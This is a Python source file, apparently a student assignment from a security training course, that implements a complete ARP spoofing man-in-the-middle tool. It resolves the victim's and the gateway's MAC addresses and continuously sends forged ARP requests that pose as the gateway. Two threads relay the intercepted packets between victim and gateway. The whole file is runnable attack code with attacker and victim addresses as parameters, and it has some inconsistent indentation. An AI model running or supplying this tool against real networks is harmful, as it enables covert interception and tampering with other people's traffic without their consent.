#!/usr/bin/python
#-*- coding: utf-8 -*-

import subprocess
import sys
import re
import struct
import threading
from time import sleep
from socket import *
from uuid import getnode as get_mac
import argparse
import binascii
###################################################################################################
execmd = lambda cmd : subprocess.check_output(cmd, shell=True)
trans_ip = lambda addr : ''.join(map(lambda x:chr(eval(x)), addr.split('.')))
trans_mac = lambda mac : ''.join(map(lambda x:x.decode('hex'), mac.split(':')))
reverse_ip = lambda addr : '.'.join(map(lambda x : str(ord(x)), [x for x in addr]))
reverse_mac = lambda mac : ':'.join(map(lambda x : x.encode('hex'), [x for x in mac]))

p16 = lambda x : struct.pack('>H', x)
p32 = lambda x : struct.pack('>I', x)
u16 = lambda x : struct.unpack('>H', x)[0]
u32 = lambda x : struct.unpack('>I', x)[0]


#Get Attacker MAC
###################################################################################################
def  ATTACKER_MAC():
    A_MAC = get_mac()
    A_MAC=':'.join(("%012X" % A_MAC)[i:i + 2] for i in range(0, 12, 2))
    return  A_MAC
###################################################################################################


#ARP Send
###################################################################################################
def socketsend(attacker_mac,gw_ip,victim_ip,victim_mac):
	while True:
		rawSocket = socket(PF_PACKET, SOCK_RAW, htons(0x0800))
		rawSocket.bind(("eth0", htons(0x0800)))

		source_mac = attacker_mac        # sender mac address
		source_ip  = gw_ip           # sender ip address
		dest_mac = victim_mac   # target mac address
		dest_ip  = victim_ip             # target ip address

		# Ethernet Header
		protocol = 0x0806                       # 0x0806 for ARP

		eth_hdr=trans_mac(dest_mac)
		eth_hdr+=trans_mac(source_mac)
		eth_hdr+=p16(protocol)

		# ARP header
		htype = 0x1                               # Hardware_type ethernet
		ptype = 0x0800                          # Protocol type TCP
		hlen = 0x6                                # Hardware address Len
		plen = 0x4                                # Protocol addr. len
		operation = 0x1                           # 1=request/2=reply
		arp_hdr=''
		arp_hdr+=p16(htype)# Hardware_type ethernet
		arp_hdr+=p16(ptype)# Protocol type TCP
		arp_hdr+=chr(hlen)# Hardware address Len
		arp_hdr+=chr(plen)# Protocol addr. len                            
		arp_hdr+=p16(operation)# 1=request/2=reply
		arp_hdr+=trans_mac(source_mac)
		arp_hdr+=trans_ip(source_ip)
		arp_hdr+=trans_mac(dest_mac)
		arp_hdr+=trans_ip(dest_ip)

		packet = eth_hdr + arp_hdr
		rawSocket.send(packet)
###################################################################################################


#Reply --- fragrouter!!
#[Victim]<->[Attacker]<->[G/W]
###################################################################################################
#Recv [Victim] -> Send [G/w]
def VictimToGw(attacker_mac,attacker_ip,gw_ip,gw_mac,victim_ip,victim_mac):
	while True:
		RecvSocket=socket(AF_PACKET, SOCK_RAW,htons(0x0003))
		recv_packet=RecvSocket.recvfrom(65535)
		recv_packet=recv_packet[0]
		ETH_HEADER=struct.unpack("!6s6s2s",recv_packet[0:14])
		

		#No ARP
		if binascii.hexlify(ETH_HEADER[2])!="0806":
			#recv victim packet
			if reverse_mac(ETH_HEADER[1])==victim_mac:
				print('\n')
				print("\tSpoofing !!!")
				print("\t\tVictim {} -> Attacker {}".format(victim_ip,attacker_ip))
				SendSocket = socket(PF_PACKET, SOCK_RAW, htons(0x0800))
				SendSocket.bind(("eth0",0))

				send_mac = attacker_mac    # sender mac address
				#send_ip  = victim_ip       # sender ip address
				dest_mac = gw_mac   	   # target mac address
				#dest_ip  = gw_ip           # target ip address

				# Ethernet Header
				protocol = 0x0800                       # 0x0800 for IP

				eth_hdr=trans_mac(dest_mac)
				eth_hdr+=trans_mac(send_mac)
				eth_hdr+=p16(protocol)
				recv_packet=eth_hdr+recv_packet[14:]
				SendSocket.send(recv_packet)

#Recv [G/W] -> Send [Victim]
###################################################################################################
def GwToVictim(attacker_mac,attacker_ip,gw_ip,gw_mac,victim_ip,victim_mac):
	while True:
		RecvSocket=socket(AF_PACKET, SOCK_RAW,htons(0x0003))
		recv_packet=RecvSocket.recvfrom(65535)
		recv_packet=recv_packet[0]
		ETH_HEADER=struct.unpack("!6s6s2s",recv_packet[0:14])

		

		#No ARP
		if binascii.hexlify(ETH_HEADER[2])!="0806":
			#recv G/W packet
			#ETH_Header [1]=Src MAC
			if binascii.hexlify(ETH_HEADER[2])=="0800":
				IP_HEADER=struct.unpack("1s1s2s2s2s1s1s2s4s4s",recv_packet[14:34])
				if reverse_mac(ETH_HEADER[1])==gw_mac:
					#IP_Header[8]=Src IP
					#IP_Header[9]=Dst IP
					if reverse_ip(IP_HEADER[9])==victim_ip:
						print('\n')
						print("\tSpoofing !!!")
						print("\t\tAttacker {} -> Victim {}".format(attacker_ip,reverse_ip(IP_HEADER[9])))
						
						SendSocket = socket(PF_PACKET, SOCK_RAW, htons(0x0800))
						SendSocket.bind(("eth0",0))

						send_mac = attacker_mac    # sender mac address
						#send_ip  = victim_ip       # sender ip address
						dest_mac = victim_mac   	   # target mac address
						dest_ip  = victim_ip           # target ip address

						# Ethernet Header
						protocol = 0x0800                       # 0x0800 for IP

						eth_hdr=trans_mac(dest_mac)
						eth_hdr+=trans_mac(send_mac)
						eth_hdr+=p16(protocol)
						recv_packet=eth_hdr+recv_packet[14:]
						SendSocket.send(recv_packet)

#Get IP to MAC
###################################################################################################
def Get_MAC(attacker_ip,attacker_mac,find_ip):
	while True:
		SendSocket = socket(PF_PACKET, SOCK_RAW, htons(0x0800))

		source_mac = attacker_mac        # sender mac address
		source_ip  = attacker_ip           # sender ip address
		dest_mac = "ff:ff:ff:ff:ff:ff"   # target mac address
		dest_ip  = find_ip             # target ip address

		# Ethernet Header
		protocol = 0x0806                       # 0x0806 for ARP

		eth_hdr=trans_mac(dest_mac)
		eth_hdr+=trans_mac(source_mac)
		eth_hdr+=p16(protocol)

		# ARP header
		htype = 0x1                               # Hardware_type ethernet
		ptype = 0x0800                          # Protocol type TCP
		hlen = 0x6                                # Hardware address Len
		plen = 0x4                                # Protocol addr. len
		operation = 0x1                           # 1=request/2=reply
		arp_hdr=''
		arp_hdr+=p16(htype)# Hardware_type ethernet
		arp_hdr+=p16(ptype)# Protocol type TCP
		arp_hdr+=chr(hlen)# Hardware address Len
		arp_hdr+=chr(plen)# Protocol addr. len                            
		arp_hdr+=p16(operation)# 1=request/2=reply
		arp_hdr+=trans_mac(source_mac)
		arp_hdr+=trans_ip(source_ip)
		arp_hdr+=trans_mac(dest_mac)
		arp_hdr+=trans_ip(dest_ip)
		packet = eth_hdr + arp_hdr
		SendSocket.bind(("eth0",0))
		SendSocket.send(packet)

		RecvSocket=socket(AF_PACKET, SOCK_RAW,htons(0x0003))
		packet=RecvSocket.recvfrom(65535)

		ETH_HEADER=struct.unpack("!6s6s2s",packet[0][0:14])
		#print("Dst MAC : {}".format(reverse_mac(ETH_HEADER[1])))
		#print("Src MAC : {}".format(reverse_mac(ETH_HEADER[0])))

		if binascii.hexlify(ETH_HEADER[2])=="0806":

			ARP_HEADER=packet[0][14:42]
        	ARP=struct.unpack("2s2s1s1s2s6s4s6s4s",ARP_HEADER)
        	ARP_HW_TYPE= binascii.hexlify(ARP[0])
        	ARP_PR_TYPE= binascii.hexlify(ARP[1])
        	ARP_HW_SIZE= binascii.hexlify(ARP[2])
        	ARP_PR_SZIE= binascii.hexlify(ARP[3])
        	ARP_OPCODE= binascii.hexlify(ARP[4])
        	ARP_SRC_MAC= binascii.hexlify(ARP[5])
        	ARP_SRC_IP=reverse_ip(ARP[6])
        	ARP_DST_MAC=binascii.hexlify(ARP[7])
        	ARP_DST_IP=reverse_ip(ARP[8])


        	if u16(ARP[4])==2:
        		if reverse_ip(ARP[6])==find_ip:
        			
        			#print("Send MAC Address == {}".format(reverse_mac(ARP[5])))
        			#print("Send IP Adress == {}".format(reverse_ip(ARP[6])))
        			#print("Dst MAC Address == {}".format(reverse_mac(ARP[7])))
        			#print("Dst IP Address == {}".format(reverse_ip(ARP[8])))
        			return reverse_mac(ARP[5])
###################################################################################################




###################################################################################################
if __name__=="__main__":
	track="DigitalForensics"
	name="LeeDongJu"
	print("Name : {}".format(name))
	print("Track : {}".format(track))

	parser = argparse.ArgumentParser(description="ARP_SPOOF BOB7")
	parser.add_argument("-a", "--hackerip", default="192.168.0.17",help="Hacker IP")
	parser.add_argument("-v", "--sendip",default="192.168.0.3",help="Sender IP Address ->Victim IP")
	parser.add_argument("-g", "--gwip", default="192.168.0.1",help="Target IP -> Gate Way")
	args = parser.parse_args()
	
###################################################################################################
	attacker_ip=args.hackerip
	attacker_mac=ATTACKER_MAC()
	victim_ip=args.sendip
	gw_ip=args.gwip

	print("\t\tIP : {}".format(victim_ip))
	victim_mac=Get_MAC(attacker_ip,attacker_mac,victim_ip)
	print("\t\tVictim MAC Address : {}\n".format(victim_mac))

	print("\t\tIP : {}".format(gw_ip))
	gw_mac=Get_MAC(attacker_ip,attacker_mac,gw_ip)
	print("\t\tGateWay MAC Address : {}\n".format(gw_mac))

###################################################################################################
	#socketsend(attacker_mac,gw_ip,victim_ip,victim_mac)
	#GwToVictim(attacker_mac,attacker_ip,gw_ip,gw_mac,victim_ip,victim_mac)
	#VictimToGw(attacker_mac,attacker_ip,gw_ip,gw_mac,victim_ip,victim_mac)
	T1=threading.Thread(target=socketsend, args=(attacker_mac,gw_ip,victim_ip,victim_mac))
	T2=threading.Thread(target=GwToVictim, args=(attacker_mac,attacker_ip,gw_ip,gw_mac,victim_ip,victim_mac))
	T3=threading.Thread(target=VictimToGw, args=(attacker_mac,attacker_ip,gw_ip,gw_mac,victim_ip,victim_mac))

	T1.start()
	T2.start()
	T3.start()
	T1.join()
	T2.join()
	T3.join()
###################################################################################################